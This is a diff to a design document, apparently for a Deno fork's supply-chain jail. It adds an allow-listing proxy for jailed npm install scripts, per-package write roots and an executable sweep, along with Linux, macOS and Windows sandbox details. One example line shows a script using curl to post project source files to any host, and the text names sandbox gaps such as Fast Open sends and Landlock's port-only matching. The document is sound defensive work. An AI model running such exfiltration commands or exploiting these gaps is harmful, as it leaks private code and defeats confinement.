@@ -3949,12 +3949,13 @@ where the changes are discussed.
        allows the network (it can't tell hosts apart), and every `deno` in the
        jail (the `node` shim, `.bin` wrappers, a script's own `deno run -A`)
        gets `--allow-net=<hosts>`. A program that isn't Deno (`curl`) can reach
-       any host, as with `true`. The list is the narrower grant, so it wins over
-       `jailScripts.net: true` and replaces the hosts the package declares; it
-       applies under `paranoid` too (it is the project's setting, not one the
-       package grants itself). An empty list, an empty host, or one with a
-       scheme, path, `@`, `?`, `#` or whitespace is a config error (`false`
-       means no network).
+       any host, as with `true` (until item 111, which routes every program
+       through an allow-listing proxy). The list is the narrower grant, so it
+       wins over `jailScripts.net: true` and replaces the hosts the package
+       declares; it applies under `paranoid` too (it is the project's setting,
+       not one the package grants itself). An empty list, an empty host, or one
+       with a scheme, path, `@`, `?`, `#` or whitespace is a config error
+       (`false` means no network).
      - **Download caches outside node_modules** (puppeteer's
        `PUPPETEER_CACHE_DIR`, playwright's `PLAYWRIGHT_BROWSERS_PATH`, cypress's
        `CYPRESS_CACHE_FOLDER`). By default such a download lands in the jail's
@@ -4130,6 +4131,112 @@ where the changes are discussed.
      the advisory is accepted, `cargo audit` reports it. Tests:
      `cargo test -p deno_crypto_provider` (X448 RFC 7748 vectors, Ed448).
 
+111. **`fix(npm)`: a jailed script's host list binds every program, and
+     per-package write roots** (`feat/jail-net-proxy`, CLI only;
+     `cli/supply_chain/jail_proxy.rs`, `cli/supply_chain/jail.rs`,
+     `cli/supply_chain/sandbox_macos.rs`, `cli/supply_chain/sandbox_linux.rs`,
+     `libs/config/deno_json/mod.rs`, `cli/schemas/config-file.v1.json`).
+     Follow-ups to items 83, 103 and 108 from denext's supply-chain audit of
+     4.8.
+     - **A host list now holds every program, not only Deno (High).** A
+       package's declared download host (node-pre-gyp's `binary.host`, item 83)
+       or a per-package host list (item 108) turned the OS sandbox's network on
+       for the whole script, and only `deno` processes were held to the hosts:
+       `sh -c "curl https://anywhere --data @src/..."` reached any host, with
+       the project's source readable. Now the jail host (the unsandboxed
+       `deno install`) starts an allow-listing HTTP proxy on `127.0.0.1` for
+       each such script: `CONNECT host:port` (HTTPS, any TCP tunnel) and
+       absolute-URI `http://` requests (forwarded in origin form with
+       `Connection: close`) to an allowed `host` / `host:port` go through,
+       anything else gets `403`. Matching is `--allow-net`'s: a host without a
+       port allows every port, names are exact (no subdomains), compared after
+       IDNA and lower-casing with a trailing dot dropped, and an IP literal in
+       any URL form (`0x7f.1`, `[0:0::1]`) matches only the same address, never
+       a name that resolves to it. The proxy resolves names itself, so the
+       script needs no DNS. Its environment points every client there:
+       `HTTP(S)_PROXY`, `ALL_PROXY` (both cases), `npm_config_proxy`,
+       `npm_config_https_proxy`, `GLOBAL_AGENT_HTTP(S)_PROXY`, and
+       `NODE_USE_ENV_PROXY=1` (Node's `http` / `https`, Deno's included); the
+       installer's `NO_PROXY` and npm proxy keys are dropped. Every `deno` in
+       the jail may connect to the proxy besides the hosts. When the installer's
+       environment names an `http://` proxy (`HTTPS_PROXY`, `HTTP_PROXY`,
+       `ALL_PROXY`, minus `NO_PROXY`), allowed connections go through it, with
+       the URL's credentials as `Proxy-Authorization`; another scheme
+       (`socks5://`) is not used, with a warning.
+     - **What the OS allows.** macOS: the Seatbelt profile denies IP traffic and
+       then allows `(remote ip "localhost:<port>")` only, with no Unix sockets
+       (the resolver's included) and no `com.apple.dnssd.service` lookup. Linux
+       6.7+ (Landlock ABI 4): `LANDLOCK_ACCESS_NET_CONNECT_TCP` with one rule
+       for the proxy's port, and seccomp allowing only TCP stream sockets
+       (protocol 0 or TCP: no UDP, so no DNS or other datagrams, and no SCTP or
+       MPTCP, which Landlock's port rules don't cover) and refusing `sendto` /
+       `sendmsg` / `sendmmsg` with `MSG_FASTOPEN` (a Fast Open send connects
+       without `connect(2)`). Landlock matches ports, not addresses: a
+       connection to another machine on the proxy's port number (random, per
+       script) is not refused by the kernel. Windows: no OS confinement, as
+       before; the proxy and its environment still apply to the clients that
+       honor them, and Deno is clamped.
+     - **No listening either.** A script without the whole network can't accept
+       connections from outside, which would hand data to whoever connects in:
+       Seatbelt's `(deny network-inbound (local ip))` (also without any network,
+       where macOS had let a script listen and serve), and Landlock's
+       `LANDLOCK_ACCESS_NET_BIND_TCP` with no rule (without network, Linux
+       refuses IP sockets already).
+     - **Linux before 6.7 (no Landlock network rules).** Hosts the package
+       declares for itself, and any host list under `paranoid`, get no network
+       (fail closed, with a warning naming the hosts): the package granted
+       itself that, or the project asked for every gate to fail closed, and most
+       such packages fall back to building from source. A host list the
+       project's deno.json grants keeps today's behavior: the network stays open
+       at the OS level, the proxy and Deno clamp still apply, and a warning
+       (once per install) says other programs can reach any host. That is the
+       project's own reviewed decision, and failing it would break installs on
+       every LTS distribution kernel older than 6.7 with no workaround short of
+       `net: true`.
+     - **`net: false` wins (Medium).** A package's `"net": false` now also drops
+       the hosts it declares for itself and wins over
+       `jailScripts.net:
+       true` (the global switch had won over it).
+     - **Per-package write roots (Medium).** A jailed script writes only beneath
+       its own package's folder (plus its `write` paths and the scratch HOME /
+       TMPDIR), no longer anywhere in node_modules (item 83): one package's
+       script can't rewrite another package's files, which run later outside the
+       jail. A package that writes a sibling directory (Prisma's
+       `node_modules/.prisma`) lists it in `write`.
+     - **Executables in a `~` cache (Low).** After a script whose package has
+       `~` write paths (item 108) finishes, files it left there with an execute
+       or set-id bit, and symlinks to such files, are removed and the script
+       fails, unless the package's entry has `"executables": true` (a browser
+       download: `"puppeteer": { ..., "executables": true }`). Such caches are
+       shared with other projects, which run what they hold outside any jail.
+       Refusing the creation itself isn't possible: neither Seatbelt nor
+       Landlock can tell file modes apart per path, and seccomp can't see paths.
+       The sweep looks at files whose inode changed since the script started
+       (`ctime`, which a script can't set back) and removes rather than clears
+       the bit, so a hard link to a file elsewhere leaves that file alone; a
+       process the script left running could still create one after the sweep.
+
+     Tests: `npm/supply_chain_jail` (`declared_host_binds_every_program`: curl
+     through the proxy reaches the declared host, plainly and through a CONNECT
+     tunnel, the proxy refuses another host, and curl around the proxy, to the
+     declared host too, and a raw socket from `node` are refused;
+     `per_package_hosts_bind_every_program`, the same for deno.json's host list;
+     `package_net_false_wins`; `no_writes_into_other_packages`, `node` and `sh`
+     writing into a sibling package, through its link and its real path, and
+     elsewhere in node_modules; `packages_only_quiet_on_windows`, item 108's
+     exceptions-only object printing no confinement warning on Windows),
+     `jail_proxy` unit tests (`allow_list_host_and_port`, `allow_list_idna`,
+     `allow_list_ip_literals`, `allow_list_rejects_non_hosts`,
+     `connect_requests`, `absolute_uri_requests`, `upstream_from_env`,
+     `forwards_allowed_and_refuses_others`, `tunnels_allowed`,
+     `chains_through_upstream_proxy`), `package_net_false_wins`,
+     `os_net_choice`, `proxy_env`, `new_executables_removed`, `home_paths` and
+     the proxy grant in `clamp` (`cli/supply_chain/jail.rs`),
+     `profile_proxy_only` (`sandbox_macos`), `seccomp_program_semantics` (a
+     small BPF interpreter over the generated program, `sandbox_linux`), and the
+     host forms and `executables` in `test_to_supply_chain_config`
+     (`libs/config/deno_json`).
+
 The runtime-side parts (1-3, 5-22, 24, 25, 27, 32-37, 41-45, 50, 52, 60-62,
 64-73, 75-77, 80, 82, 87-89, 91, 93, 95, 97, 99-102, 104, 105, 109, 110) are
 what the prebuilt `libdenort` carries. The CLI-side parts (for example writing
@@ -4181,7 +4288,7 @@ under `paranoid`, a weaker one is an error.
 | `paranoid`                   | `paranoid`                                                         |                                        | `false` | Every gate on and failing closed (item 86).                                                                                             |
 | `jail-scripts`               | `jailScripts`: `true` / `false`, or `{ net, packages }`            | `--jail-scripts` / `--no-jail-scripts` | `true`  | Approved dependencies' lifecycle scripts run confined (item 83; on by default, item 103). `false` opts out, not under `paranoid`.       |
 |                              | `jailScripts.net`                                                  |                                        | `false` | Network for every jailed script.                                                                                                        |
-|                              | `jailScripts.packages.<name>`: `{ env, write, net }`               |                                        |         | A package's exceptions: environment variables passed through, extra writable directories (relative to deno.json), network.              |
+|                              | `jailScripts.packages.<name>`: `{ env, write, net, executables }`  |                                        |         | A package's exceptions: environment variables passed through, extra writable directories (relative to deno.json), network.              |
 | `advisory-check`             | `advisoryCheck`: `"on"` / `"off"` / `"required"`                   |                                        | `on`    | Refuse versions OSV lists as malicious; `required` also refuses when OSV can't be reached (item 84).                                    |
 | `low-download-check`         | `lowDownloadCheck`: `"off"` / `"warn"` / `"prompt"` / `"required"` |                                        | `warn`  | What `deno add` does below the threshold: warn and add; ask in a terminal and refuse without one; also refuse unknown counts (item 85). |
 | `low-download-threshold`     | `lowDownloadThreshold`                                             |                                        | `1000`  | Weekly downloads below which the low-download check applies; `0` turns it off (item 85).                                                |
